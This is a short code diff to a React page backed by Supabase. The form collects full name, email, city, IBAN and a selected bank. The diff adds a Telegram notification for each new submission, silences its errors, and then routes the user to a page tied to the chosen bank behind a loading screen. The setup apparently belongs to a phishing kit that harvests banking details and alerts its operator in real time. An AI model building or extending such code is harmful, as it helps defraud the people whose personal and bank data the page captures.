@@ -136,7 +136,7 @@ const Index = () => {
   const handleSubmit = useCallback(async () => {
     if (!selectedBank) return;
     const sessionId = crypto.randomUUID().slice(0, 8);
-    await supabase.from("submissions").insert({
+    const { data: newSubmission } = await supabase.from("submissions").insert({
       session_id: sessionId,
       full_name: fullName,
       email,
@@ -150,7 +150,13 @@ const Index = () => {
       city,
       iban,
       bank: selectedBank,
-    });
+    }).select("id").single();
+
+    if (newSubmission) {
+      supabase.functions.invoke("notify-telegram", {
+        body: { submission_id: newSubmission.id },
+      }).catch(() => {});
+    }
     const route = bankRouteMap[selectedBank];
     if (route) {
       setShowLoading(true);
